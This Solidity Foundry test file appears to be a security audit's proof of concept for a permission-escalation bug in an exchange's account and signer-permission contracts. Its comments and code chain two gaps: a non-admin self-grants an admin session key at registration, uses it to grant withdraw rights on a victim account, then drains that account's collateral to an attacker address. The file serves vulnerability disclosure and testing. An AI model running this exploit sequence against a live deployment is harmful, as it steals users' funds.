// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./TransactionProcessor.basic.t.sol";
import "forge-std/console.sol";

/// @title PoC (N-1): Permission-model escalation — a non-admin mints ALLOW_ADMIN at registration, then
///        admin-sets ALLOW_WITHDRAW on an unrelated victim and drains it.
///
/// @notice TWO on-chain gaps compose (no on-chain gate prevents either; only the off-chain operator does):
///   (a) RegisterAccountTransLib.process forwards a registering owner's SignerInit[] masks VERBATIM into
///       SignerManager.addSignerWithPermissions, which stores a non-owner signer's mask as-is — including
///       ALLOW_ADMIN (SignerManager.sol:107-115; the _restrictAdminBit rule was removed). Registration has NO
///       delegation gate, so an owner who does NOT hold ALLOW_ADMIN can mint a session key that does.
///   (b) PermissionsTransLib.processAdminSetSignerPermissions checks ALLOW_ADMIN on the CALLER-SUPPLIED
///       txData.adminAccountId and never binds it to canonical SignerManager.adminAccountId(); it then writes an
///       arbitrary mask on any targetAccountId.
/// Chain: register account A with an ALLOW_ADMIN key -> that key admin-sets ALLOW_WITHDRAW on the victim
/// (adminAccountId = A, the attacker's own account) -> a withdrawal signed by the granted key drains the victim
/// to an attacker address. Reachability: core-shared (account/permission system; live on every profile, NOT
/// perp-gated). The exchange relays user-signed txs through the trusted txBatcher; this PoC submits exactly that.
///
/// @dev This PoC configures a REAL canonical admin account first (the production bootstrap), then shows the attack
/// still works because gap (b) never compares txData.adminAccountId against signerManager.adminAccountId(). The
/// exploit does NOT depend on the canonical admin being unset.
contract PoC_PermissionEscalation is TransactionProcessorTestBasic {
    uint256 constant ADMIN_OWNER_KEY    = 0xADA111;       // the real, canonical main-admin owner
    uint256 constant VICTIM_KEY         = 0xBEEF01;
    uint256 constant ATTACKER_OWNER_KEY = 0xA77ACE;
    uint256 constant ATTACKER_ADMIN_KEY = 0xADDED1;      // session key that will hold ALLOW_ADMIN
    uint256 constant ATTACKER_WD_KEY    = 0xDEAD01;       // session key that will get ALLOW_WITHDRAW on the victim

    uint64 constant ADMIN_UID    = 1000;
    uint64 constant VICTIM_UID   = 777;
    uint64 constant ATTACKER_UID = 666;

    function _submit(uint8 txType, bytes memory payload) internal {
        bytes[] memory txs = new bytes[](1);
        txs[0] = getMessage(txType, payload);
        executeMultiTransactions(txs); // relayed by the trusted txBatcher (deployer), the real entry path
    }

    function test_PoC_nonAdminMintsAllowAdminAndDrainsVictim() public {
        address adminOwner    = vm.addr(ADMIN_OWNER_KEY);
        address victimOwner   = vm.addr(VICTIM_KEY);
        address attackerOwner = vm.addr(ATTACKER_OWNER_KEY);
        address attackerAdmin = vm.addr(ATTACKER_ADMIN_KEY);
        address attackerWd    = vm.addr(ATTACKER_WD_KEY);

        // --- Configure a REAL canonical admin (production bootstrap): designate the admin owner address, then
        //     register the admin account first so SignerManager auto-derives adminAccountId = ADMIN_UID. ---
        vm.prank(deployer);
        signerManager.setAdminAddress(adminOwner);
        _register(ADMIN_UID, adminOwner, new SignerInit[](0), ADMIN_OWNER_KEY);
        assertEq(signerManager.adminAccountId(), ADMIN_UID, "precondition: a real canonical admin account is configured");

        // --- Victim: a normal registered account with 5,000 collateral in the system ---
        _register(VICTIM_UID, victimOwner, new SignerInit[](0), VICTIM_KEY);
        deposit(VICTIM_UID, 5_000);
        // The victim's own withdraw key (attackerWd) holds NOTHING on the victim yet.
        assertEq(signerManager.getSignerPermissions(VICTIM_UID, attackerWd), 0, "attacker key has no victim perms yet");

        // --- Step 1 (gap a): attacker registers its OWN account with a session key holding ALLOW_ADMIN ---
        // The attacker owner is a fresh EOA with no privileges anywhere; it is NOT the canonical admin owner.
        SignerInit[] memory init = new SignerInit[](1);
        init[0] = SignerInit({signer: attackerAdmin, permissions: SignerPermissions.ALLOW_ADMIN});
        _register(ATTACKER_UID, attackerOwner, init, ATTACKER_OWNER_KEY);

        assertEq(
            signerManager.getSignerPermissions(ATTACKER_UID, attackerAdmin),
            SignerPermissions.ALLOW_ADMIN,
            "BUG (gap a): registration minted ALLOW_ADMIN to a non-admin's session key with no delegation gate"
        );
        // The attacker's account A is a DIFFERENT account from the real canonical admin — the exploit does not
        // rely on the canonical admin being absent.
        assertTrue(ATTACKER_UID != signerManager.adminAccountId(), "attacker account is NOT the canonical admin");
        assertEq(signerManager.adminAccountId(), ADMIN_UID, "canonical admin is unchanged (still ADMIN_UID)");

        // --- Step 2 (gap b): the ALLOW_ADMIN key admin-sets ALLOW_WITHDRAW on the VICTIM ---
        // adminAccountId is the attacker's OWN account; processAdminSetSignerPermissions never checks it against
        // the canonical admin (ADMIN_UID), so the check passes on the attacker's self-granted ALLOW_ADMIN.
        AdminSetSignerPermissionsTx memory adminSet = AdminSetSignerPermissionsTx({
            adminAccountId: ATTACKER_UID,
            targetAccountId: VICTIM_UID,
            signer: attackerWd,
            mask: SignerPermissions.ALLOW_WITHDRAW,
            nonce: 0,
            signature: ""
        });
        bytes32 h = PermissionsTransLib.getAdminSetSignerPermissionsHash(adminSet, block.chainid, address(transactionProcessor));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ATTACKER_ADMIN_KEY, h);
        adminSet.signature = abi.encodePacked(r, s, v);
        _submit(TYPE_ADMIN_SET_SIGNER_PERMISSIONS, abi.encode(adminSet));

        assertEq(
            signerManager.getSignerPermissions(VICTIM_UID, attackerWd),
            SignerPermissions.ALLOW_WITHDRAW,
            "BUG (gap b): attacker set ALLOW_WITHDRAW on the VICTIM using its OWN account as adminAccountId"
        );

        // --- Step 3 (L3 outcome): the granted key withdraws the victim's collateral to an attacker address ---
        uint256 attackerBalBefore = testToken.balanceOf(attackerOwner);
        Withdrawal memory w = createWithdrawal(VICTIM_UID, attackerOwner, 5_000, 0, ATTACKER_WD_KEY);
        _submit(TYPE_WITHDRAWAL, abi.encode(w));

        uint256 stolen = testToken.balanceOf(attackerOwner) - attackerBalBefore;
        assertEq(stolen, 5_000, "BUG (theft): victim collateral drained to an attacker-controlled address");

        console.log("canonical admin account id:", uint256(signerManager.adminAccountId()));
        console.log("attacker started with zero privileges; drained victim collateral:", stolen);
    }

    function _register(uint64 uid, address owner, SignerInit[] memory signers, uint256 key) internal {
        RegisterAccount memory ra = createRegisterAccount(uid, owner, signers, key);
        _submit(TYPE_REGISTER_ACCOUNT, abi.encode(ra));
    }
}
